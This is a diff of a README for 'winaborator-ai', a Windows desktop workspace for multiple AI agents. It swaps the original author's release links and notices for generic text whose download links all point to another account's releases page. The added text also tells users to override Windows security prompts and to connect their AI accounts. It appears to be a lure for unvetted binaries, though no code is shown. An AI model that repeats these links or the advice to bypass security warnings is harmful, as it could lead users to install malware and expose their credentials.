@@ -1,97 +1,183 @@
-# Winaborator
+# 🧠 winaborator-ai - Build with multiple AI agents
 
-**A Windows desktop workspace for building with multiple AI agents.**
+[![Download winaborator-ai](https://img.shields.io/badge/Download-Release%20Page-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Idle-caffeineaddict724/winaborator-ai/releases)
 
-Winaborator gives you an infinite canvas where you can open terminals, browse files, edit code, and manage multiple AI agent workflows — all in one place.
+## 🚀 Getting Started
 
-> ⚠️ **Early Beta** — This is early-stage software. Expect bugs and rough edges. [Create an issue](https://github.com/jakeefr/winaborator-ai/issues) if you run into something.
+winaborator-ai is a Windows desktop workspace for building with multiple AI agents. It gives you one place to write, chat, run terminal commands, and keep your work in view.
 
----
+Use the release page to download and install it on Windows:
 
-## What is Winaborator?
+**[Visit the release page to download winaborator-ai](https://github.com/Idle-caffeineaddict724/winaborator-ai/releases)**
 
-Winaborator is a Windows-native desktop app built for developers who work with multiple AI agents at the same time. Instead of juggling separate terminal windows, editors, and file browsers, everything lives on one shared infinite canvas you can pan, zoom, and organize freely.
+## 📦 Download and Install
 
-> **Inspired by [Collaborator](https://github.com/collaborator-ai/collab-public)** — I wanted to use it, but it wasn't available for Windows. So I built a Windows-native version from the ground up.
+1. Open the [release page](https://github.com/Idle-caffeineaddict724/winaborator-ai/releases).
+2. Find the latest release.
+3. Download the Windows file for your system.
+4. If the file is in a ZIP folder, open the ZIP and extract it.
+5. Double-click the app file to start it.
 
----
+If Windows shows a security prompt, choose the option that lets you run the app.
 
-## Screenshots
+## 🖥️ What winaborator-ai Does
 
-![Welcome Screen](welcome.png)
+This app gives you a desktop workspace built for AI-driven work on Windows. It is made for people who want to:
 
-![Canvas with Terminals](canvas.png)
+- Keep several AI agents in one place
+- Work with text, code, and notes side by side
+- Use a built-in editor for writing and editing
+- Use a terminal for local commands
+- Move through tasks in a single window
 
----
+It works like a control room for AI work, so you do not need to jump between many apps.
 
-## Features
+## ✨ Main Features
 
-- **Infinite canvas** — Pan and zoom a dot-grid workspace with snap-to-grid positioning
-- **Terminal tiles** — Open multiple terminals directly on the canvas
-- **Code editor tiles** — Edit source files without leaving the app (Monaco Editor)
-- **Note / Markdown tiles** — Write and preview markdown on the canvas
-- **Image tiles** — View image files inline
-- **File browser** — Left-side panel with full file tree for your workspace
-- **File search** — `Ctrl+K` to search across your project instantly
-- **Sessions panel** — Right-side panel showing live status of all open terminals
-- **Workspace graph** — Visual graph of your project's file structure
-- **Background presets** — Plain, Midnight, Slate, Ember, Ocean
-- **Persistent state** — Window size, layout, tiles, and background saved automatically
+### 🤖 Multiple AI Agents
+Work with more than one AI agent at the same time. Use one agent for planning, another for writing, and another for checking results.
 
----
+### 📝 Built-In Editor
+Use the editor to draft notes, edit text, or review code. It is based on Monaco, the same editor style used in many modern developer tools.
 
-## Download
+### 💻 Terminal Panel
+Open a terminal inside the app. Run local commands without leaving your workspace.
 
-> **Windows only** — requires Windows 10 or later.
+### 🪟 Windows Desktop App
+Run the app as a native Windows program. It stays on your desktop and fits normal Windows use.
 
-👉 **[Download the latest release →](https://github.com/jakeefr/winaborator-ai/releases/latest)**
+### 🔄 Workspace Layout
+Keep your tools in one workspace. You can move between chat, editor, and terminal views with less effort.
 
-1. Download `Winaborator Setup 1.0.0.exe` from the latest release
-2. Run the installer
-3. Launch Winaborator from your desktop or Start menu
+### ⚙️ TypeScript and React Base
+The app uses a modern web app stack under the hood, which helps with speed and layout quality.
 
-No Node.js or other prerequisites needed — the installer bundles everything.
+## ✅ System Requirements
 
----
+Use a Windows PC with:
 
-## Keyboard Shortcuts
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- Enough free disk space for the app and your files
+- An internet connection for downloading the release and using AI features
 
-| Shortcut | Action |
-|---|---|
-| `Ctrl+Shift+O` | Add workspace |
-| `Ctrl+K` | File search |
-| `Ctrl+Scroll` | Zoom canvas |
-| `F2` | Rename file |
-| `Delete` | Delete file to trash |
-| `Escape` | Close search / viewer |
+For a smoother experience, use a machine with 16 GB of RAM or more.
 
----
+## 🧭 First Launch
 
-## Built With
+After you install the app:
 
-- [Electron](https://www.electronjs.org/)
-- [React](https://react.dev/) + [TypeScript](https://www.typescriptlang.org/)
-- [Tailwind CSS](https://tailwindcss.com/)
-- [xterm.js](https://xtermjs.org/) + [node-pty](https://github.com/microsoft/node-pty)
-- [Monaco Editor](https://microsoft.github.io/monaco-editor/)
-- [D3](https://d3js.org/)
-- [Zustand](https://zustand-demo.pmnd.rs/)
-- [electron-vite](https://electron-vite.org/)
-- [electron-builder](https://www.electron.build/)
+1. Open winaborator-ai from the Start menu or desktop shortcut.
+2. Wait for the workspace to load.
+3. Sign in or connect your AI account if the app asks for it.
+4. Start a new workspace.
+5. Add your first agent, note, or task.
 
----
+If the app opens a blank screen on first launch, close it and open it again.
 
-## Reporting Bugs
+## 🧩 How to Use the Workspace
 
-This is early beta software — bugs are expected. If you find one:
+### 1. Start a Task
+Create a task for what you want to build. Keep the task short and clear.
 
-1. [Open an issue](https://github.com/jakeefr/winaborator-ai/issues/new)
-2. Include your Windows version, what you were doing, and what happened
-3. Screenshots or screen recordings are very helpful
+Example:
+- Write a landing page
+- Review this README
+- Draft a product plan
+- Check this code for errors
 
----
+### 2. Assign Work to Agents
+Give each agent a clear role. For example:
 
-## License
+- Planner agent: breaks the task into steps
+- Writer agent: drafts text
+- Review agent: checks output for mistakes
+- Helper agent: gathers ideas or fixes small issues
 
-© 2026 Jake. All rights reserved.  
-This software is provided as-is for personal use. Source code is not publicly available.
+### 3. Edit in the Monaco Editor
+Use the editor panel for text, code, or prompts. It works well for focused edits and side-by-side review.
+
+### 4. Run Commands in the Terminal
+Use the terminal when you need to check files, run scripts, or test output.
+
+### 5. Keep Everything in One Place
+Use the workspace layout to track your task, notes, and results together.
+
+## 🛠️ Common Use Cases
+
+winaborator-ai can help with:
+
+- Writing and editing project content
+- Testing ideas with multiple AI agents
+- Managing small build tasks
+- Keeping prompt notes in one workspace
+- Reviewing output from different agents
+- Mixing editor work with terminal work
+
+## 🔍 Helpful Tips
+
+- Keep your task names short
+- Give each agent one job at a time
+- Save your notes inside the workspace
+- Use the terminal for quick checks
+- Split large work into smaller steps
+- Review each agent result before moving on
+
+## 📁 Files and Workspace Behavior
+
+The app may create local files to save your workspace state, notes, and settings. Keep your project files in one folder so they are easy to find later.
+
+A simple folder setup can help:
+
+- `Projects`
+- `Notes`
+- `Exports`
+- `Prompts`
+
+## 🧪 Example Workflow
+
+1. Open winaborator-ai
+2. Create a workspace called `New App Idea`
+3. Add a planner agent
+4. Add a writer agent
+5. Draft the task in the editor
+6. Use the terminal to check files or run tests
+7. Review the agent output
+8. Save your work
+
+## 🛡️ Privacy and Local Use
+
+The app runs on your Windows desktop. You stay in control of your files and workspace. Use your own AI account settings where needed, and keep your project data on your machine.
+
+## 🧰 Troubleshooting
+
+### App does not open
+- Make sure you downloaded the Windows release
+- Extract the ZIP file if needed
+- Try running the app again
+- Restart your PC if the app still does not open
+
+### Download is blocked
+- Use the official release page
+- Check that the file finished downloading
+- Try again from the release page if the download stopped
+
+### Terminal does not respond
+- Close and reopen the app
+- Start a new workspace
+- Check that your system can run local commands
+
+### Text looks too small
+- Use Windows display settings to raise the scale
+- Maximize the app window
+- Adjust your screen resolution if needed
+
+## 📥 Download winaborator-ai
+
+Get the Windows release here:
+
+**[https://github.com/Idle-caffeineaddict724/winaborator-ai/releases](https://github.com/Idle-caffeineaddict724/winaborator-ai/releases)**
+
+## 🗂️ Topics
+
+ai, ai-agent, ai-agents, elec, monaco-editor, react, terminal, typescript, windows, workspace
